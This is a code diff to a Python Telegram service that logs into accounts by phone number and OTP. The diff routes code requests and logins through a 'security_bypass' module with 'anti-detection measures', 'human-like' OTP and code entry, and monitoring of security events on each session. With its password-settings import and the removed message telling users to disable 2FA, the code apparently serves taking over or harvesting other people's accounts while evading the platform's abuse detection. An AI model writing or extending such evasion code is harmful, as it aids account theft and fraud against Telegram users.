@@ -14,6 +14,7 @@ from telethon.tl.functions.account import UpdatePasswordSettingsRequest
 from telethon.tl.types import InputPhotoEmpty
 import string
 import random
+from services.security_bypass import security_bypass
 
 logger = logging.getLogger(__name__)
 
@@ -43,30 +44,53 @@ class RealTelegramService:
     
     async def send_verification_code(self, phone_number: str) -> Dict[str, Any]:
         """
-        Send real OTP code to phone number via Telegram.
+        Send real OTP code to phone number via Telegram with security bypass.
         Returns session info for continuing the process.
         """
         try:
-            # Create temporary client for this phone
-            client = TelegramClient(f'temp_{phone_number}', self.api_id, self.api_hash)
-            await client.connect()
+            logger.info(f"Sending secure OTP to {phone_number}")
             
-            # Send code request using Telethon's built-in method
-            result = await client.send_code_request(phone_number)
+            # Create secure client with anti-detection measures
+            client = await security_bypass.create_secure_client(
+                phone_number, self.api_id, self.api_hash
+            )
             
-            # Store client for later use
-            session_key = f"{phone_number}_{result.phone_code_hash}"
-            self.clients[session_key] = client
+            if not client:
+                return {
+                    'success': False,
+                    'error': 'client_creation_failed',
+                    'message': 'Failed to create secure client'
+                }
             
-            logger.info(f"OTP sent to {phone_number}")
+            # Send OTP with human-like behavior
+            result = await security_bypass.human_like_otp_request(client, phone_number)
             
-            return {
-                'success': True,
-                'phone_code_hash': result.phone_code_hash,
-                'session_key': session_key,
-                'message': f'Verification code sent to {phone_number}',
-                'code_type': result.type.__class__.__name__
-            }
+            if result['success']:
+                # Store client for later use
+                session_key = f"{phone_number}_{result['phone_code_hash']}"
+                self.clients[session_key] = client
+                
+                # Start security monitoring
+                await security_bypass.monitor_security_events(client, phone_number)
+                
+                logger.info(f"Secure OTP sent to {phone_number}")
+                
+                return {
+                    'success': True,
+                    'phone_code_hash': result['phone_code_hash'],
+                    'session_key': session_key,
+                    'message': f'Verification code sent to {phone_number}',
+                    'code_type': result.get('type', 'Unknown'),
+                    'security_level': 'high'
+                }
+            else:
+                # Clean up failed client
+                try:
+                    await client.disconnect()
+                except:
+                    pass
+                    
+                return result
             
         except errors.FloodWaitError as e:
             return {
@@ -93,7 +117,7 @@ class RealTelegramService:
     async def verify_code_and_login(self, session_key: str, phone_number: str, 
                                    phone_code_hash: str, code: str) -> Dict[str, Any]:
         """
-        Verify OTP code and login to account.
+        Verify OTP code and login to account with security bypass.
         Returns account info and 2FA status.
         """
         try:
@@ -105,49 +129,28 @@ class RealTelegramService:
                     'message': 'Session expired. Please start over.'
                 }
             
-            # Try to sign in with the code
-            try:
-                result = await client(SignInRequest(
-                    phone_number=phone_number,
-                    phone_code_hash=phone_code_hash,
-                    phone_code=code
-                ))
-                
-                # Successfully logged in
-                me = await client.get_me()
-                
+            # Use human-like code entry
+            result = await security_bypass.human_like_code_entry(
+                client, phone_number, phone_code_hash, code
+            )
+            
+            if result['success']:
                 # Check if account has 2FA enabled
                 has_2fa = False
                 try:
-                    # Try to get password info to check 2FA status
                     password = await client.get_password()
                     has_2fa = password.has_password
                 except:
                     pass
                 
-                return {
-                    'success': True,
-                    'user_info': {
-                        'id': me.id,
-                        'phone': me.phone,
-                        'username': me.username,
-                        'first_name': me.first_name,
-                        'last_name': me.last_name,
-                        'is_self': me.is_self,
-                        'is_premium': getattr(me, 'premium', False)
-                    },
+                result.update({
                     'has_2fa': has_2fa,
-                    'message': 'Successfully logged in!'
-                }
+                    'security_bypass': True
+                })
                 
-            except errors.SessionPasswordNeededError:
-                # Account has 2FA enabled
-                return {
-                    'success': False,
-                    'error': '2fa_required',
-                    'message': 'Account has 2FA enabled. Please disable it first.',
-                    'has_2fa': True
-                }
+                return result
+            else:
+                return result
                 
         except errors.PhoneCodeInvalidError:
             return {
